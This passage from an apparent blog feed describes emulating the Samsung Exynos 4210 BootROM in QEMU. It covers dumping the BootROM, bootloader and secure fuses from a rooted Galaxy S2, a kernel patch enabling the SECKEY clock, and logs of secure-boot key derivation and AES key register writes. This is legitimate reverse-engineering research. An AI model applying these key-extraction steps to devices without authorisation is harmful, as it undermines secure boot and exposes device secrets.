&lt;/ul&gt;</content><category term="arm"></category><category term="exynos"></category><category term="samsung"></category><category term="bootrom"></category><category term="trustzone"></category><category term="exploit"></category></entry><entry><title>Emulating Exynos 4210 BootROM in QEMU</title><link href="https://fredericb.info/2018/03/emulating-exynos-4210-bootrom-in-qemu.html" rel="alternate"></link><published>2018-03-07T00:00:00-08:00</published><updated>2018-03-07T00:00:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2018-03-07:/2018/03/emulating-exynos-4210-bootrom-in-qemu.html</id><summary type="html">&lt;p&gt;&lt;a href="https://www.qemu.org/"&gt;QEMU&lt;/a&gt; has support for the SMDKC210 machine, an ARM board based on Exynos 4210 SoC.
Peripherals implemented in QEMU for this machine are &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/char/exynos4210_uart.c"&gt;UART&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/sd/sdhci.c"&gt;SDHCI&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/display/exynos4210_fimd.c"&gt;FIMD&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/i2c/exynos4210_i2c.c"&gt;I2C&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/intc/exynos4210_combiner.c"&gt;Interrupt Combiner&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/intc/exynos4210_gic.c"&gt;GIC&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_clk.c"&gt;Clock&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_pmu.c"&gt;PMU&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_rng.c"&gt;RNG&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_mct.c"&gt;MCT&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_pwm.c"&gt;PWM&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_rtc.c"&gt;RTC&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.gsmarena.com/samsung_i9100_galaxy_s_ii-3621.php"&gt;Samsung Galaxy S2&lt;/a&gt; phone is also based on Exynos 4210, so it should be …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a href="https://www.qemu.org/"&gt;QEMU&lt;/a&gt; has support for the SMDKC210 machine, an ARM board based on Exynos 4210 SoC.
Peripherals implemented in QEMU for this machine are &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/char/exynos4210_uart.c"&gt;UART&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/sd/sdhci.c"&gt;SDHCI&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/display/exynos4210_fimd.c"&gt;FIMD&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/i2c/exynos4210_i2c.c"&gt;I2C&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/intc/exynos4210_combiner.c"&gt;Interrupt Combiner&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/intc/exynos4210_gic.c"&gt;GIC&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_clk.c"&gt;Clock&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_pmu.c"&gt;PMU&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_rng.c"&gt;RNG&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_mct.c"&gt;MCT&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_pwm.c"&gt;PWM&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_rtc.c"&gt;RTC&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.gsmarena.com/samsung_i9100_galaxy_s_ii-3621.php"&gt;Samsung Galaxy S2&lt;/a&gt; phone is also based on Exynos 4210, so it should be &lt;strong&gt;&lt;em&gt;relatively&lt;/em&gt;&lt;/strong&gt; easy to emulate its BootROM in QEMU.&lt;/p&gt;
&lt;p&gt;This article describes how to extract BootROM (and associated fuses) from Galaxy S2 phone, implement additional required peripherals in QEMU (like the hardware cryptographic engine), and debug inevitable issues. Source code has been published on &lt;a href="https://github.com/frederic/qemu-exynos-bootrom"&gt;GitHub&lt;/a&gt;. We'll also take advantage of the dynamic debugging capability offered by QEMU to have a quick look at secure boot implementation.&lt;/p&gt;
&lt;h1&gt;Documentation&lt;/h1&gt;
&lt;p&gt;&lt;img alt="Exynos 4 Dual 45nm" src="https://fredericb.info/blog/qemu-exynos4210/exynos_4210_features.jpg" width="700px"&gt;&lt;/p&gt;
&lt;p&gt;Samsung has released &lt;a href="http://www.samsung.com/global/business/semiconductor/file/product/Exynos_4_Dual_45nm_User_Manaul_Public_REV1.00-0.pdf"&gt;a (partial) datasheet&lt;/a&gt;.
It includes the following memory map :&lt;/p&gt;
&lt;p&gt;&lt;img alt="Memory Map" src="https://fredericb.info/blog/qemu-exynos4210/exynos_4210_memmap.png"&gt;&lt;/p&gt;
&lt;p&gt;Another significant ressource is the &lt;a href="https://github.com/pngcui/uboot-2017.07-iTop4412"&gt;U-Boot source code&lt;/a&gt; for development boards (like &lt;a href="http://www.hardkernel.com/main/products/prdt_info.php?g_code=G133999328931"&gt;ODROID X&lt;/a&gt;) based on same processor. It contains interesting technical information on hardware peripherals (like addresses, registers, values).&lt;/p&gt;
&lt;p&gt;Finally, hacker &lt;a href="https://forum.xda-developers.com/showthread.php?t=1986887"&gt;community&lt;/a&gt; has &lt;a href="https://forum.xda-developers.com/showthread.php?t=1274999"&gt;contributed&lt;/a&gt; a &lt;a href="https://forum.xda-developers.com/showthread.php?t=1313588"&gt;lot&lt;/a&gt; over the past years.&lt;/p&gt;
&lt;h1&gt;Dump all the things&lt;/h1&gt;
&lt;p&gt;First of all, we have to extract the BootROM we want to emulate from the Exynos 4210 SoC. We will also extract fuses data and first bootloader (from flash memory) as they are required to complete execution of BootROM.&lt;/p&gt;
&lt;p&gt;We use a Galaxy S2 phone, with ADB access and root privileges thanks to &lt;a href="https://github.com/timwr/CVE-2013-6282"&gt;CVE-2013-6282 exploit&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Dump bootloader&lt;/h2&gt;
&lt;p&gt;The bootloader stored on flash memory is loaded, authenticated (eventually), and executed by BootROM.
Accessible through the &lt;strong&gt;mmcblk0boot0&lt;/strong&gt; device file, we dump it using builtin &lt;strong&gt;dd&lt;/strong&gt; command :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# dd if=/dev/block/mmcblk0boot0 of=./mmc_boot.img seek=1 bs=512&lt;/span&gt;
&lt;span class="m"&gt;1024&lt;/span&gt;+0 records in
&lt;span class="m"&gt;1024&lt;/span&gt;+0 records out
&lt;span class="m"&gt;524288&lt;/span&gt; bytes transferred in &lt;span class="m"&gt;0&lt;/span&gt;.091 secs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5761406&lt;/span&gt; bytes/sec&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We generate an entropy graph of dumped data using &lt;a href="https://github.com/ReFirmLabs/binwalk"&gt;binwalk tool&lt;/a&gt; :&lt;/p&gt;
&lt;p&gt;&lt;img alt="Entropy of bootloader image" src="https://fredericb.info/blog/qemu-exynos4210/exynos_4210_bootloader_entropy.png"&gt;&lt;/p&gt;
&lt;p&gt;The first part with high entropy (almost E=1) is the encrypted FWBL1 image, the next stage to execute after BootROM.&lt;/p&gt;
&lt;h2&gt;Dump BootROM&lt;/h2&gt;
&lt;p&gt;Memory map indicates that BootROM, also called iROM, is mapped at address &lt;strong&gt;0x0000_0000&lt;/strong&gt;.
On this device, stock Android kernel is compiled with &lt;strong&gt;&lt;em&gt;/dev/mem&lt;/em&gt;&lt;/strong&gt; support, so we can directly use the simple &lt;a href="https://github.com/Vee7-Cyanogenmod13/device_lge_l7II/tree/cm-13.0/viewmem"&gt;viewmem tool&lt;/a&gt; to dump BootROM (yeah, chipset from 2011).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ./viewmem 0x00000000 0x10000 &amp;gt; ./bootrom.bin       &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Reading &lt;span class="m"&gt;65536&lt;/span&gt; bytes at 0x0...
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Dump fuses&lt;/h2&gt;
&lt;p&gt;Fuses a.k.a. One-Time Programmable (OTP) memory usually contain important information for security, like boot settings, cryptographic keys or hashes.
According to datasheet, fuses are in the &lt;strong&gt;SECKEY&lt;/strong&gt; area at address &lt;strong&gt;0x10100000&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;However in this case, &lt;a href="https://github.com/Vee7-Cyanogenmod13/device_lge_l7II/tree/cm-13.0/viewmem"&gt;viewmem tool&lt;/a&gt; fails to read data directly.
The cause of this issue is explained in &lt;a href="https://redmine.replicant.us/projects/replicant/wiki/NexusSI902xBootloader"&gt;another research&lt;/a&gt; for a similar processor.
We learn that accessing &lt;strong&gt;SECKEY&lt;/strong&gt; requires to enable the specific hardware clock &lt;strong&gt;CLK_SECKEY&lt;/strong&gt; (bit 12 of &lt;strong&gt;CLK_GATE_IP_PERIR&lt;/strong&gt; register).&lt;/p&gt;
&lt;p&gt;The solution is to build a modified kernel to enable that clock at boot.&lt;/p&gt;
&lt;p&gt;Samsung has released the &lt;a href="http://opensource.samsung.com/reception/receptionSub.do?method=sub&amp;amp;sub=F&amp;amp;searchValue=sph-d710"&gt;kernel source code&lt;/a&gt;, however initramfs is missing to generate a fully fonctional kernel image. So we dump the original kernel partition (like we did for bootloader partition) and &lt;a href="https://github.com/davidmroth/Extract-Kernel-Initramfs"&gt;extract&lt;/a&gt; initramfs archive. We can then append extracted initramfs to our custom kernel by setting &lt;strong&gt;&lt;em&gt;CONFIG_INITRAMFS_DIRECTORY&lt;/em&gt;&lt;/strong&gt; option in kernel configuration.&lt;/p&gt;
&lt;p&gt;We apply the following kernel patch to enable &lt;strong&gt;CLK_SECKEY&lt;/strong&gt; clock at boot :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gd"&gt;--- a/arch/arm/mach-exynos/clock-exynos4.c  2013-02-21 05:23:03.000000000 -0800&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/arch/arm/mach-exynos/clock-exynos4.c  2018-02-25 00:11:03.817693249 -0800&lt;/span&gt;
&lt;span class="gu"&gt;@@ -1352,11 +1352,11 @@&lt;/span&gt;

 static struct clk exynos4_init_clocks[] = {
    {
&lt;span class="gd"&gt;-#ifndef CONFIG_CPU_EXYNOS4210&lt;/span&gt;
        .name       = &amp;quot;seckey&amp;quot;,
        .enable     = exynos4_clk_ip_perir_ctrl,
        .ctrlbit    = (1 &amp;lt;&amp;lt; 12),
    }, {
&lt;span class="gi"&gt;+#ifndef CONFIG_CPU_EXYNOS4210&lt;/span&gt;
        .name       = &amp;quot;tzpc&amp;quot;,
        .devname    = &amp;quot;exnos4-tzpc.5&amp;quot;,
        .enable     = exynos4_clk_ip_perir_ctrl,
&lt;span class="gu"&gt;@@ -2386,6 +2386,17 @@&lt;/span&gt;

    for (ptr = 0; ptr &amp;lt; ARRAY_SIZE(exynos4_clksrcs); ptr++)
        s3c_set_clksrc(&amp;amp;exynos4_clksrcs[ptr], true);
&lt;span class="gi"&gt;+&lt;/span&gt;
&lt;span class="gi"&gt;+   printk(KERN_INFO &amp;quot;%s: Looking for seckey clock...\n&amp;quot;, __func__);&lt;/span&gt;
&lt;span class="gi"&gt;+   for (ptr = 0; ptr &amp;lt; ARRAY_SIZE(exynos4_init_clocks); ptr++) {&lt;/span&gt;
&lt;span class="gi"&gt;+       if (exynos4_init_clocks[ptr].name == NULL)&lt;/span&gt;
&lt;span class="gi"&gt;+           break;&lt;/span&gt;
&lt;span class="gi"&gt;+&lt;/span&gt;
&lt;span class="gi"&gt;+       if (strcmp(&amp;quot;seckey&amp;quot;, exynos4_init_clocks[ptr].name) == 0) {&lt;/span&gt;
&lt;span class="gi"&gt;+           printk(KERN_INFO &amp;quot;%s: Enabling seckey clock\n&amp;quot;, __func__);&lt;/span&gt;
&lt;span class="gi"&gt;+           clk_enable(&amp;amp;exynos4_init_clocks[ptr]);&lt;/span&gt;
&lt;span class="gi"&gt;+       }&lt;/span&gt;
&lt;span class="gi"&gt;+   }&lt;/span&gt;
 }

 static struct clk *exynos4_clks[] __initdata = {
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After flashing and booting this custom kernel on Galasy S2 device, we can dump fuses data with &lt;a href="https://github.com/Vee7-Cyanogenmod13/device_lge_l7II/tree/cm-13.0/viewmem"&gt;viewmem tool&lt;/a&gt;, like we did for BootROM :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ./viewmem 0x10100000 0x100 &amp;gt; ./fuses.bin           &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Reading &lt;span class="m"&gt;256&lt;/span&gt; bytes at 0x10100000...
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Debugging&lt;/h1&gt;
&lt;p&gt;We have the BootROM, fuses data, and the first bootloader from flash memory.
However, we should not expect it to run properly on the first try.&lt;/p&gt;
&lt;p&gt;The following QEMU features were used to debug issues and develop new QEMU peripherals :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://git.qemu.org/?p=qemu.git;a=blob_plain;f=docs/devel/tracing.txt;hb=HEAD"&gt;Trace events&lt;/a&gt; : output debug log when specific instructions are hit.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.qemu.org/Documentation/Debugging"&gt;GDB stub&lt;/a&gt; : attach your favorite debugger i.e. GDB or IDA.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikibooks.org/wiki/QEMU/Monitor"&gt;Monitor console&lt;/a&gt; : interact with QEMU while guest is running, for example to enable specific trace events.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Most issues are related to peripherals and will cause QEMU to hang (e.g. infinite loop due to polling of non-implemented hardware register).&lt;/p&gt;
&lt;h1&gt;QEMU changes&lt;/h1&gt;
&lt;p&gt;Despite the number of peripherals implemented for this SoC, some are still missing to complete execution of BootROM with success.
Following sections describe the main changes made in &lt;a href="https://github.com/frederic/qemu-exynos-bootrom"&gt;QEMU source tree&lt;/a&gt; for this project. New peripherals are heavily based on existing ones in upstream QEMU project.&lt;/p&gt;
&lt;h2&gt;Add BootROM loading support&lt;/h2&gt;
&lt;p&gt;For this machine, QEMU is supposed to run U-Boot bootloader or Linux kernel directly. By default, only a &lt;a href="https://github.com/qemu/qemu/blob/master/hw/arm/exynos4210.c#L128"&gt;small &amp;amp; minimal bootloader&lt;/a&gt; is loaded in secondary CPUs, which is not relevant for this project.&lt;/p&gt;
&lt;p&gt;In order to load BootROM in memory before starting the machine, we take advantage of the existing BIOS loading feature in QEMU.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/frederic/qemu-exynos-bootrom/commit/23ce5e32774a2ae834e3ed99dd2d26a1be5a2d8a"&gt;With this change&lt;/a&gt;, BootROM image file can now be loaded in memory thanks to &lt;strong&gt;-bios&lt;/strong&gt; parameter. It will be executed directly when emulated machine is reset.&lt;/p&gt;
&lt;h2&gt;One-Time Programmable (OTP) memory emulation&lt;/h2&gt;
&lt;p&gt;One-Time Programmable (OTP) memory is a MMIO peripheral used to store device-specific data. Read operations can be performed with simple load instructions, but write operations (or fusing) are usually more complex.&lt;/p&gt;
&lt;p&gt;For this project, OTP peripheral is &lt;a href="https://github.com/frederic/qemu-exynos-bootrom/commit/70c8b2088c6e24d7863609a2368e3591859a114d"&gt;implemented as a simple read-only memory&lt;/a&gt;, initialized with fuses data dumped from Galaxy S2 device. Write operations are not supported.&lt;/p&gt;
&lt;p&gt;When BootROM is executed, QEMU debug log provides detailed information on OTP data accessed.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;First OTP access is a read operation on area 0x18-0x2C. Based on static analysis, BootROM checks these fuses are provisioned (not null) :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x18&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x1c&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x20&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x24&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x28&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Same area 0x18-0x2C (20 bytes) is read a second time to derive HMAC-SHA1 key (to authenticate next bootloader) :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x18&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x19&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x2a&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x2b&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;The area is read a third time, but only first 16 bytes, to derive AES-CBC-128 key (to decrypt next bootloader) :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x18&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x19&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x26&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x27&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Advanced Crypto Engine (ACE) emulation&lt;/h2&gt;
&lt;p&gt;Advanced Crypto Engine (ACE) peripheral performs hardware-accelerated cryptographic operations. ACE interface, composed of many Special Function Registers (SFR), is way more complex than the OTP one.
Fortunately, these SFR are &lt;a href="https://github.com/exynos4-sdk/uboot/blob/master/arch/arm/include/asm/arch-exynos/ace_sfr.h"&gt;documented in U-Boot source code&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Again, &lt;a href="https://github.com/frederic/qemu-exynos-bootrom/commit/4deef8737da3a683bc858e91eba5a588a2879b0a"&gt;our implementation&lt;/a&gt; is limited to features actually used by BootROM : only AES-CBC-128 operations are supported.&lt;/p&gt;
&lt;p&gt;When BootROM is executed, QEMU debug log details how ACE peripheral is used :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Set AES key, IV, and other parameters (&lt;strong&gt;ACE_AES_CONTROL&lt;/strong&gt; register) :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_CONTROL&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0200&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x0e8b&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_KEY5&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0290&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0xebc4ad63&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_KEY6&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0294&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x27239f1a&lt;/span&gt;
